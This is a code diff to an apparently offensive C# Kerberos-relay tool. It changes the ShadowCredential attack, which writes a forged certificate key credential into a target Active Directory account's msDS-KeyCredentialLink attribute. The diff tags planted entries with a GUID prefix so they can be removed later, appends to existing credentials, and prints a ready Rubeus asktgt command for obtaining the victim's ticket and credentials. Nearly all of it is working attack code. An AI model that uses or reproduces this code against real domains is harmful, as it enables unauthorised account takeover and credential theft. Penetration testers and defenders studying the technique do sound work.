@@ -9,7 +9,9 @@ using Org.BouncyCastle.Security;
 using Org.BouncyCastle.Utilities;
 using Org.BouncyCastle.X509;
 using System;
+using System.Collections.Generic;
 using System.IO;
+using System.Linq;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
@@ -18,13 +20,34 @@ namespace KrbRelay.Clients.Attacks.Ldap
 {
     internal class ShadowCredential
     {
-        // writing to msDS-KeyCredentialLink can only be done once.
+        static readonly byte[] GuidTrackPrefix = new byte[] { 0xd0, 0x9f, 0x1b, 0x27 }; 
+
         public static LdapStatus attack(IntPtr ld, string target = "")
         {
-            //string dn = Generic.getMachineDN(ld, "");
-            string dn = Generic.getPropertyValue(ld, target, "distinguishedName");
+            string dn = Generic.GetDistinguishedNameFromAccountName(ld, target);
             string password = Guid.NewGuid().ToString();
-            //Console.WriteLine(dn);
+
+            // First query and remove existing entries we might have added
+
+            List<byte[]> entries = Generic.GetAttribute(ld, dn, "msDS-KeyCredentialLink");
+
+            if (entries.Count > 0)
+            {
+                Console.WriteLine("[*] Existing linked credentials:");
+                foreach(var entry in entries)
+                {
+                    var credential = KeyCredential.ParseDNBinary(Encoding.ASCII.GetString(entry));
+                    byte[] guidPrefix = credential.DeviceId?.ToByteArray().Take(GuidTrackPrefix.Length).ToArray();
+                    if (guidPrefix.SequenceEqual(GuidTrackPrefix))
+                    {
+                        var removeResult = Generic.RemoveAttribute(ld, dn, "msDS-KeyCredentialLink", entry);
+                        Console.WriteLine(" |- {0} [Delete -> {1}]", credential.DeviceId, removeResult);
+                    } else
+                    {
+                        Console.WriteLine(" |- {0}", credential.DeviceId);
+                    }
+                }
+            }
 
             X509Certificate2 cert;
             KeyCredential keyCredential;
@@ -46,28 +69,52 @@ namespace KrbRelay.Clients.Attacks.Ldap
             );
             cert = req.CreateSelfSigned(DateTimeOffset.Now, DateTimeOffset.Now.AddYears(1));
 
+            // Apply a prefix so we can track for removal later
+
             Guid guid = Guid.NewGuid();
+            byte[] guidBytes = guid.ToByteArray();
+            for(int i = 0; i < GuidTrackPrefix.Length; i++)
+            {
+                guidBytes[i] = GuidTrackPrefix[i];
+            }
+            guid = new Guid(guidBytes);
+
             keyCredential = new KeyCredential(cert, guid, dn, DateTime.Now);
 
-            LdapStatus ret = Generic.setAttribute(
-                ld,
-                "msDS-KeyCredentialLink",
-                Encoding.ASCII.GetBytes(keyCredential.ToDNWithBinary()),
-                dn
-            );
-            if (ret != LdapStatus.Success)
-                return ret;
+            LdapStatus result;
+            if (entries.Count > 0)
+            {
+                result = Generic.AddAttribute(
+                    ld,
+                    dn,
+                    "msDS-KeyCredentialLink",
+                    Encoding.ASCII.GetBytes(keyCredential.ToDNWithBinary())
+                );
+            } else
+            {
+                result = Generic.SetAttribute(
+                    ld,
+                    dn,
+                    "msDS-KeyCredentialLink",
+                    Encoding.ASCII.GetBytes(keyCredential.ToDNWithBinary())
+                );
+            }
+
+
+            if (result != LdapStatus.Success)
+                return result;
 
             byte[] certBytes = cert.Export(X509ContentType.Pfx, password);
             var certOutput = Convert.ToBase64String(certBytes);
+            Console.WriteLine("[+] Added credentials, here is your Rubeus command:\n");
             Console.WriteLine(
-                "Rubeus.exe asktgt /user:{0} /certificate:{1} /password:\"{2}\" /getcredentials /show",
+                "Rubeus.exe asktgt /user:{0} /certificate:{1} /password:\"{2}\" /getcredentials /show\n",
                 target,
                 certOutput,
                 password
             );
 
-            return ret;
+            return result;
         }
 
         //https://stackoverflow.com/a/51687630
